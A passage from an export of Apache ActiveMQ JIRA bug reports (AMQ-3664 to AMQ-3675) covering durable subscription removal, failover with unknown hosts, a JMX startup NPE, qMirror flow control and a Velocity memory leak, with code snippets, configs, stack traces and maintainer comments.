A related question to the above is should the advisory 

- ""ActiveMQ.Advisory.Consumer.Topic.XXX""  or
- ""ActiveMQ.Advisory.Consumer.Queue.XXX"" 

Be recreated when the active consumer reattaches to the queue or topic?

When you remove, via jmx, the Queue or Topic the associated Consumer Advisory Topic is also removed.
When the queue or topic is recreated, and the consumer re-assigned to the new queue; the advisory isn't
created/fired.  Would this cause any issues?  Should an advisory be sent?  does it affect *{{dynamicallyIncludedDestinations}}*
and the use of the Advisories when using a network of brokers?


cheers
/dom",Mac OS X (10.7.2),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jan/12 12:10;dominict;CountMessagesRecievedOnDurableTopicAfterTopicDeletion.java;https://issues.apache.org/jira/secure/attachment/12511660/CountMessagesRecievedOnDurableTopicAfterTopicDeletion.java","24/Jan/12 12:10;dominict;Topic.patch.txt;https://issues.apache.org/jira/secure/attachment/12511661/Topic.patch.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,225102,,,Mon Apr 16 05:48:25 UTC 2012,,,,,,,Patch Available,,,,"0|i0aiav:",59238,,,,,,,,,,,,,,,,,,,,,"16/Apr/12 05:48;rajdavies;Fixed by SVN revision 1326493;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Removing a DurableTopicSubscription leaves subscription in active subscriptions map,AMQ-3675,12539342,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,dominict,dominict,22/Jan/12 18:12,24/Jan/12 20:40,14/Jul/23 05:43,24/Jan/12 20:40,5.5.1,,,,,5.6.0,,,Broker,,,,0,DurableSubscriptions,Topic,,,,,,,"- Url reference: http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/TopicRegion.java?revision=1160894&view=markup

When removing a durable topic subscription, the *{{subscriptions}}* map is left with the durable subscription on the map.  This means that if you were to remove the topic and then recreate the topic, you end up with a continually increasing consumerCount on the Topic.  Replication on the Web Admin console is:

- Create inactive durable subscriber
- delete the associated topic
- delete inactive durable subscriber
- Create inactive durable subscriber

The topic will now think/show it has 2 subscribers on the destinationStatistics associated with the topic.

This seems to boil down to an accidental use of identity comparison on the *{{subscriptions}}* map in the method *{{public void removeSubscription(ConnectionContext context, RemoveSubscriptionInfo info) throws Exception }}*:

{noformat}
196  if (subscriptions.get(sub.getConsumerInfo()) != null) {
197 	 super.removeConsumer(context, sub.getConsumerInfo());
198  } else {
199 	// try destroying inactive subscriptions
200 	destroySubscription(sub);
201  }
{noformat}

which should be (i think):

{noformat}
196  if (subscriptions.get(sub.getConsumerInfo().getConsumerId()) != null) {
197 	 super.removeConsumer(context, sub.getConsumerInfo());
198  } else {
199 	// try destroying inactive subscriptions
200 	destroySubscription(sub);
201  }
{noformat}


Subscriptions are added to the map using the *{{getConsumerId()}}*, not the identity of the ConsumerInfo object; elsewhere in the class; hence the suggestion for using *{{getConsumerId()}}*

Hope that makes sense.
cheers
/dom","5.5.1, Mac OS X 10.7.2",zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/12 22:29;dominict;CountConsumersAfterSubscriptionRemoval.java;https://issues.apache.org/jira/secure/attachment/12511570/CountConsumersAfterSubscriptionRemoval.java","23/Jan/12 22:29;dominict;TopicRegion.AMQ-3675.patch.txt;https://issues.apache.org/jira/secure/attachment/12511569/TopicRegion.AMQ-3675.patch.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,224844,,,Tue Jan 24 20:40:08 UTC 2012,,,,,,,,,,,"0|i0aib3:",59239,,,,,,,,,,,,,,,,,,,,,"23/Jan/12 14:12;tabish;Adding a unit test and supplying a patch would be a good contribution.;;;","23/Jan/12 22:30;dominict;Attached patch file, and junit test case.  Junit uses the activemq-web, to simulate the removal of the subscripts/topic and addition of the subscription and obtaining the consumer count.

cheers
/dom ;;;","24/Jan/12 20:40;tabish;Cleaned up the test to remove the need for the activemq-web dependency and sleep calls, and added some additional checks.  Applied suggested fix, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TopicRegion removes durableScriber from durableSubscriptions when it is active; but leaves subscription on Topic",AMQ-3674,12539340,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,dominict,dominict,22/Jan/12 17:57,24/Jan/12 22:18,14/Jul/23 05:43,24/Jan/12 16:38,5.5.1,,,,,5.6.0,,,Broker,,,,0,Topic,,,,,,,,"http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/TopicRegion.java?revision=1160894&view=markup

Via the Web Admin Console you can attempt to remove a durable topic subscription when it is active; however you will receive the message: ""Durable consumer is in use"".  However, there is unfortunate side effect of this attempt in that the *{{durableSubscriptions}}* map is modified and the subscription is removed from the map, and the topic is left with subscription.    If you subsequentially then disconnect the active durable topic consumer (so it's in an active state; where you and attempt to remove the subscription), you cannot remove the inactive subscription as you hit: ""No durable subscription exists for:""

{noformat}
 @Override
    public void removeSubscription(ConnectionContext context, RemoveSubscriptionInfo info) throws Exception {
        SubscriptionKey key = new SubscriptionKey(info.getClientId(), info.getSubscriptionName());
        DurableTopicSubscription sub = durableSubscriptions.remove(key);
        if (sub == null) {
            throw new InvalidDestinationException(""No durable subscription exists for: "" + info.getSubscriptionName());
        }
        if (sub.isActive()) {
            throw new JMSException(""Durable consumer is in use"");
        }
{noformat}


The above maybe should be changed to, where the subscription is *{{get}}* from the map, and only removed if it's !sub.isActive().  (Or perhaps re add the subscription to the map if it is Active)

{noformat}
 @Override
    public void removeSubscription(ConnectionContext context, RemoveSubscriptionInfo info) throws Exception {
        SubscriptionKey key = new SubscriptionKey(info.getClientId(), info.getSubscriptionName());
        DurableTopicSubscription sub = durableSubscriptions.get(key);
        if (sub == null) {
            throw new InvalidDestinationException(""No durable subscription exists for: "" + info.getSubscriptionName());
        }
        if (sub.isActive()) {
            throw new JMSException(""Durable consumer is in use"");
        }

        if(sub!=null) { 
          durableSubscriptions.remove(key);
        }
{noformat}


let me know if that makes no sense; and i'll try to create you a sample unit test.

cheers
/dom","5.5.1 (5.5.1-fuse-01-20), Mac OS X 10.7.2 (11.2.0 Darwin Kernel Version 11.2.0)",zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/12 22:31;dominict;RemoveDurableSubscriptionTest.java;https://issues.apache.org/jira/secure/attachment/12511572/RemoveDurableSubscriptionTest.java","23/Jan/12 22:31;dominict;TopicRegion.AMQ-3674.patch.txt;https://issues.apache.org/jira/secure/attachment/12511573/TopicRegion.AMQ-3674.patch.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,224842,,,Tue Jan 24 22:18:55 UTC 2012,,,,,,,,,,,"0|i0aibb:",59240,,,,,,,,,,,,,,,,,,,,,"23/Jan/12 14:10;tabish;This seems valid, a test case and a supplied patch to resolved the issue would be a nice contribution.  ;;;","23/Jan/12 22:32;dominict;Attached patch, and junit.;;;","24/Jan/12 16:38;tabish;Simplified the test case and patch a little and applied.  Thanks!;;;","24/Jan/12 22:03;dominict;Hi Tim,

Thanks for the feedback.  Just wondering, should that else statement do a remove from the map; rather than the get?

{noformat}
} else {
182 	durableSubscriptions.get(key);
183 	} 
{noformat}

i.e. 

{noformat}
} else {
182 	durableSubscriptions.remove(key);
183 	} 
{noformat}


cheers
/dom;;;","24/Jan/12 22:18;tabish;Good catch, fixed it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unexpected behavior in FailoverTransport when hosts are unknown,AMQ-3673,12539166,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,notiriel,notiriel,20/Jan/12 16:37,23/Jan/12 20:47,14/Jul/23 05:43,23/Jan/12 20:47,5.5.0,,,,,5.6.0,,,JMS client,,,,0,,,,,,,,,"There's an unexpected behavior when a failover url is specified where the first host does not exist, e.g.

failover:(tcp://nonexistinghost.mydomain.com:61616,tcp://existinghost.mydomain.com:61616)?randomize=false

The failover code will never switch to the tcp://existinghost.mydomain.com:61616 while when using this url:

failover:(tcp://nonexistinghost.mydomain.com:61617,tcp://existinghost.mydomain.com:61616)?randomize=false

The failover works flawlessly. I tracket the problem down to the method org.apache.activemq.transport.failover.FailoverTransport.contains(URI):

{noformat}

private boolean contains(URI newURI) {

        boolean result = false;
        try {
        for (URI uri:uris) {
            if (newURI.getPort()==uri.getPort()) {
                InetAddress newAddr = InetAddress.getByName(newURI.getHost());
                InetAddress addr = InetAddress.getByName(uri.getHost());
                if (addr.equals(newAddr)) {
                    result = true;
                    break;
                }
            }
        }
        }catch(IOException e) {
            result = true;
            LOG.error(""Failed to verify URI "" + newURI + "" already known: "" + e);
        }
        return result;
    }

{noformat}

That only resolves hostnames if the ports are not equal (this is why the different port behavior comes from).

In above mentioned case in the second call to this method this line fails with a UnknownHostException: 

{noformat}
InetAddress addr = InetAddress.getByName(uri.getHost());
{noformat}

and the result of contains() is set to true because of the catch block, therefore the second URL isn't added to the list of urls.

I suggest to change the catch block to return false. In case of an IOException during the check it's hard to say whether the URIs are the same or not, but it's more likely that they're not the same as in this case. ","MacOS X 10.5
Java(TM) SE Runtime Environment (build 1.6.0_26-b03-384-10M3425)",zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Jan/12 08:15;notiriel;FailoverNoHostException.java;https://issues.apache.org/jira/secure/attachment/12511370/FailoverNoHostException.java","20/Jan/12 16:42;notiriel;patch.diff;https://issues.apache.org/jira/secure/attachment/12511272/patch.diff",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,224668,,,Mon Jan 23 20:47:12 UTC 2012,,,,,,,Patch Available,,,,"0|i0agqv:",58986,,,,,,,,,,,,,,,,,,,,,"20/Jan/12 16:42;notiriel;Patch that changes Log entry and return value;;;","20/Jan/12 16:45;tabish;We need a test case to validate the behavior.  ;;;","21/Jan/12 08:15;notiriel;Added testcase;;;","23/Jan/12 15:13;tabish;You need to ensure that you tick the grant license to apache when attaching test cases and patches otherwise we can't use them.  ;;;","23/Jan/12 20:47;tabish;Fix applied in trunk with tests.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NPE exception when querying a starting broker use JMX program ,AMQ-3672,12539165,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,tabish,tabish,tabish,20/Jan/12 16:32,20/Jan/12 17:13,14/Jul/23 05:43,20/Jan/12 17:13,5.5.1,,,,,5.6.0,,,JMX,,,,0,,,,,,,,,"Hi,

This occurs in the latest release, SP-20. Essentially if your broker is slow starting up, e.g. you force a rebuild of the index file by deleting db.data & db.redo on a large kahadb and you try to obtain the list of queues on the broker, e.g. mbean.getQueues(), you'll get a NPE exception:

{noformat}

java.lang.NullPointerException
	at org.apache.activemq.broker.jmx.BrokerView.getQueues(BrokerView.java:189)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:93)
	at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:27)
	at com.sun.jmx.mbeanserver.MBeanIntrospector.invokeM(MBeanIntrospector.java:208)
	at com.sun.jmx.mbeanserver.PerInterface.getAttribute(PerInterface.java:65)
	at com.sun.jmx.mbeanserver.MBeanSupport.getAttribute(MBeanSupport.java:216)
	at javax.management.StandardMBean.getAttribute(StandardMBean.java:358)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:666)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638)
	at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnectionImpl.java:1404)
	at javax.management.remote.rmi.RMIConnectionImpl.access$200(RMIConnectionImpl.java:72)
	at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run(RMIConnectionImpl.java:1265)
	at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(RMIConnectionImpl.java:1360)
	at javax.management.remote.rmi.RMIConnectionImpl.getAttribute(RMIConnectionImpl.java:600)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:305)
	at sun.rmi.transport.Transport$1.run(Transport.java:159)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
	at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)

{noformat}

Looks like the BrokerService initially creates the BrokerView with a null ManagedRegionBroker and then later fills this in once the BrokerSerice start is completed. When the index is being recovered this process is delayed and you have the chance to get access to the BrokerView while it still doesn't have its ManagedRegionBroker instance set. 

This affects a slave as well as a normal broker that requires a long time to start up the store.  The BrokerView class should be checking the broker reference to see if its not set and throw an IllegalStateException indicating that the broker is not yet started.

There are also cases where a NullPointerException from the removeConnector methods that should be checked and a NoSuchElementException in those cases
",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,224667,,,Fri Jan 20 17:13:15 UTC 2012,,,,,,,,,,,"0|i0aibj:",59241,,,,,,,,,,,,,,,,,,,,,"20/Jan/12 17:13;tabish;Fix applied in trunk along with a test case;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix NACK support for Stomp,AMQ-3670,12539116,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,20/Jan/12 10:16,20/Jan/12 11:01,14/Jul/23 05:43,20/Jan/12 11:01,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,Currently there's no test for it and it seems to be buggy.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,224618,,,Fri Jan 20 11:01:29 UTC 2012,,,,,,,,,,,"0|i0aibr:",59242,,,,,,,,,,,,,,,,,,,,,"20/Jan/12 11:01;dejanb;Fixed with svn revision 1233860. NACKed messages will be sent straight to DLQ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Pending producer with qMirror, messages are not spooled to disk",AMQ-3669,12539109,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,darius.schier,darius.schier,20/Jan/12 09:37,02/Jun/17 09:35,14/Jul/23 05:43,23/May/12 20:27,5.5.1,,,,,5.7.0,,,Broker,Message Store,,,0,,,,,,,,,"We fill a queue that is backed by a qmirror with data (persistent) that exceeds the configured memory limit.
The producer (producerFlowControl=""true"" at queue and qmirror) will be throttled when the the limit is reached, no messages are spooled to disk.
As an overall result, we are not able to write a lot of messages into amq.

*Configuration:*

{code:xml} 
	<destinationInterceptors>
		<mirroredQueue copyMessage = ""true"" postfix="".qmirror"" prefix=""""/>
	</destinationInterceptors>

	<destinationPolicy>
		<policyMap>
		  <policyEntries>
			<policyEntry topic="">"" producerFlowControl=""true"" memoryLimit=""2mb"" />
			<policyEntry queue=""created.static.for.persistent"" producerFlowControl=""true"" memoryLimit=""1mb"" />
		  </policyEntries>
		</policyMap>
	</destinationPolicy> 

	<destinations>
		<queue physicalName=""created.static.for.persistent"" />
	</destinations>

	<persistenceAdapter>
		<kahaDB directory=""${activemq.base}/data/kahadb""/>
	</persistenceAdapter>
	
	<systemUsage>
		<systemUsage>
			<memoryUsage><memoryUsage limit=""10 mb"" /></memoryUsage>
			<storeUsage><storeUsage limit=""100 mb""/></storeUsage>
			<tempUsage><tempUsage limit=""100 mb""/></tempUsage>
		</systemUsage>
	</systemUsage>
	
	<transportConnectors>
		<transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616""/>
	</transportConnectors>
 {code}

*Java test code:*

{code} 
    ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(""tcp://localhost:61616"");
    Connection connection = factory.createConnection(""user"", ""pwd"");
    connection.start();
    Session session = connection.createSession(false, Session.CLIENT_ACKNOWLEDGE);
    Destination destination = session.createQueue(""created.static.for.persistent"");
    MessageProducer producer = session.createProducer(destination);
    producer.setDeliveryMode(DeliveryMode.PERSISTENT);
    char[] m = new char[1024];
    Arrays.fill(m, 'x');
    // create some messages that have 1k each
    for (int i = 0; i < 12000; i++) {
      ActiveMQTextMessage message = new ActiveMQTextMessage();
      message.setText(new String(m));
      producer.send(message);
    }
    connection.stop();
    connection.close();
  }

{code} 

*Expectation:*

Messages should be written to disk when the memory limit exceeds, all messages should be available within the queue/topic.

*Result:*

 INFO | Usage Manager memory limit (2097152) reached for topic://created.static.for.persistent.qmirror. Producers will be throttled to the rate at which messages are removed from this destination to prevent flooding it. See http://activemq.apache.org/producer-flow-control.html for more info

Store percent used  : 10 
Memory percent used : 20
Temp percent used   : 0

Interesting: The smaller flow control for the queue (1mb) does not seem to catch but the qmirror does (2mb).
","local test on windows, happens also on linux remotely",ccorsi,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-6695,,,,,,,,,,,,,"20/May/12 05:21;ccorsi;mirroredqueue.diffs;https://issues.apache.org/jira/secure/attachment/12528300/mirroredqueue.diffs",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,224611,,,Wed May 23 20:27:50 UTC 2012,,,,,,,,,,,"0|i0aibz:",59243,,,,,,,,,,,,,,,,,,,,,"20/Jan/12 16:06;darius.schier;One more information: If we set 
{noformat}<policyEntry topic="">"" producerFlowControl=""false"" memoryLimit=""2mb"" />{noformat}
we get 

Memory percent used: 100

after inserting 5111 messages. Console tells

 INFO | Started SelectChannelConnector@0.0.0.0:8161
 INFO | Usage Manager Memory Limit (1048576) reached on queue://created.static.for.persistent. Producers will be throttled to the rate at which messages are removed from this destination to prevent flooding it. See http://activemq.apache.org/producer-flow-control.html for more info

Another indication that no messages are spooled to disk?
;;;","15/Feb/12 09:21;pse;We ran into a similar problem. Disabling flow control for the mirror topics helped.

I'm still not exactly sure what happens -- AMQ-3671 suggest that the mirrored Messages are cached in the mirrored Topic, even if no subscribers are present. I'm not sure about that, since I did not observe an increase in memomry usage in the same amount as I piped messagues through my mirrored queues. Anyway, it DOES seem like a bug to me that flow control is applied in this case.

{code}
  <destinationPolicy>
    <policyMap>
      <policyEntries>
        ...
        <policyEntry topic=""*.qmirror"" producerFlowControl=""false""/>
      </policyEntries>
    </policyMap>
  </destinationPolicy>
{code};;;","20/May/12 05:19;ccorsi;I was able to determine what the problem was with this issue.

It is that when we initially forward the message to the mirrored topic.  The message memory usage instance is set to the topic.

When the message is sent to the queue, the memory usage instance is not set to the queue memory usage but it still uses the topic memory usage.

The message setRegionDestination method is used to set the message memory usage but this is only performed if and only if the current message memory usage instance is null.  This is not the case when forwarding the message to the queue and that is why the memory usage of the topic gets affected causing the producer flow control to throttle the topic/queue when that is not the case.
;;;","20/May/12 05:21;ccorsi;This patch contains a test and the fix to this issue.

btw, this patch was applied against trunk and I have not tried to apply this on an earlier version.;;;","23/May/12 20:27;tabish;Patch applied with thanks. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Velocity's IntroSpectionCache causes OutOfMemoryError on large AMQ stores when running activem-admin journal-audit,AMQ-3665,12538633,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tmielke,tmielke,tmielke,17/Jan/12 14:28,23/Jan/12 13:37,14/Jul/23 05:43,23/Jan/12 13:37,5.5.1,,,,,5.6.0,,,Broker,,,,0,activmq-admin,journal-audit,OOM,OutOfMemoryError,velocity,,,,"activemq-admin journal-audit can be used to dump the content of the AMQ store to system out. The format of the output is rendered using Velocity.
For large AMQ stores (e.g. 3GB) activemq-admin will run out of memory. 
This is because Velocity internally uses an introSpectionCache that fills up over time until heap memory is exhausted. 

There is some documentation on that cache in the Velocity [Developers Guide|http://velocity.apache.org/engine/devel/developer-guide.html] in section ""Other Context Issues"":

{quote}
One of the features provided by the VelocityContext (or any Context derived from AbstractContext) is node specific introspection caching. Generally, you as a the developer don't need to worry about this when using the VelocityContext as your context. However, there is currently one known usage pattern where you must be aware of this feature.

The VelocityContext will accumulate intropection information about the syntax nodes in a template as it visits those nodes. So, in the following situation:

- You are iterating over the same template using the same VelocityContext object.
- Template caching is off.
- You request the Template from getTemplate() on each iteration.

It is possible that your VelocityContext will appear to 'leak' memory (it is really just gathering more introspection information.) What happens is that it accumulates template node introspection information for each template it visits, and as template caching is off, it appears to the VelocityContext that it is visiting a new template each time. Hence it gathers more introspection information and grows. It is highly recommended that you do one or more of the following:

- Create a new VelocityContext for each excursion down through the template render process. This will prevent the accumulation of introspection cache data. For the case where you want to reuse the VelocityContext because it's populated with data or objects, you can simply wrap the populated VelocityContext in another, and the 'outer' one will accumulate the introspection information, which you will just discard. Ex. VelocityContext useThis = new VelocityContext( populatedVC ); This works because the outer context will store the introspection cache data, and get any requested data from the inner context (as it is empty.) Be careful though - if your template places data into the context and it's expected that it will be used in the subsequent iterations, you will need to do one of the other fixes, as any template #set() statements will be stored in the outermost context. See the discussion in Context chaining for more information.
- Turn on template caching. This will prevent the template from being re-parsed on each iteration, resulting the the VelocityContext being able to not only avoid adding to the introspection cache information, but be able to use it resulting in a performance improvement.
- Reuse the Template object for the duration of the loop iterations. Then you won't be forcing Velocity, if the cache is turned off, to reread and reparse the same template over and over, so the VelocityContext won't gather new introspection information each time.
{quote}


Right now the Velocity introSpectionCache grows with every entry read from the journal until an OOM error is raised. 
","AMQ persistence store, activemq-admin journal-audit",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/12 13:31;tmielke;AMQ-3665.patch;https://issues.apache.org/jira/secure/attachment/12511493/AMQ-3665.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,224136,,,Mon Jan 23 13:36:33 UTC 2012,,,,,,,Patch Available,,,,"0|i0aicf:",59245,,,,,,,,,,,,,,,,,,,,,"18/Jan/12 13:00;tmielke;Attaching a patch for this bug. 
Will work out a JUnit test next and commit the fix thereafter. 

The patch simply turns on template caching in Velocity via org.apache.activemq.console.command.store.amq.CustomResourceLoader. 
;;;","23/Jan/12 13:36;tmielke;Bug resolved in revisions [#1234779|http://svn.apache.org/viewvc?view=revision&revision=1234779] - [#1234783|http://svn.apache.org/viewvc?view=revision&revision=1234783];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Not all messages will be acknowledged when optimizeAcknowledge is true,AMQ-3664,12538611,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,matw,matw,17/Jan/12 09:38,18/Sep/12 10:16,14/Jul/23 05:43,18/Sep/12 10:16,5.5.1,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"I make performance test with activemq. When I set optimizeAcknowledge = true I get a dramatic performance improvement, but when I shut down the producer the consumer does not acknowledge all messages! If I stop the consumer and then I start the consumer a second time the consumer recieves messages again and again not all messages will be acknoledged in the queue.

I am using camel 2.9.0 to produce and consume the messages.
I am using the consumer Template with asyncSendBody.
The following route is configured in the camelContext:

{noformat}

    <camel:camelContext id=""camelContext"">
    	<camel:template id=""producerTemplate""/>
    	<camel:consumerTemplate id=""consumerTemplate""/>
    	<camel:route>
    		<camel:from uri=""jms:queue0?concurrentConsumers=3&amp;maxConcurrentConsumers=10&amp;asyncConsumer=true""/>
    		<camel:to uri=""beanConsumer""/>
    	</camel:route>
    </camel:camelContext>

The config for the ActiveMQComponent:
    <bean id=""jms"" class=""org.apache.activemq.camel.component.ActiveMQComponent"">
		<property name=""connectionFactory"">		
			<bean class=""org.apache.activemq.pool.PooledConnectionFactory"">
   				<property name=""connectionFactory"">
  					<bean class=""org.apache.activemq.spring.ActiveMQConnectionFactory"">
   						<property name=""optimizeAcknowledge"" value=""true""/>
   						<property name=""dispatchAsync"" value=""true""/>
  						<property name=""sendAcksAsync"" value=""true""/>
  						<property name=""useAsyncSend"" value=""true""/>
				 		<property name=""brokerURL"" value=""nio://138-ham-de:61616""/>				 		
				 		<property name=""useDedicatedTaskRunner"" value=""false""/> 
    				</bean>	
      			</property>
      		</bean>
      	</property>
    </bean>

{noformat}

I think, the problem is here:
Class ActiveMQMessageConsumer:

{noformat}

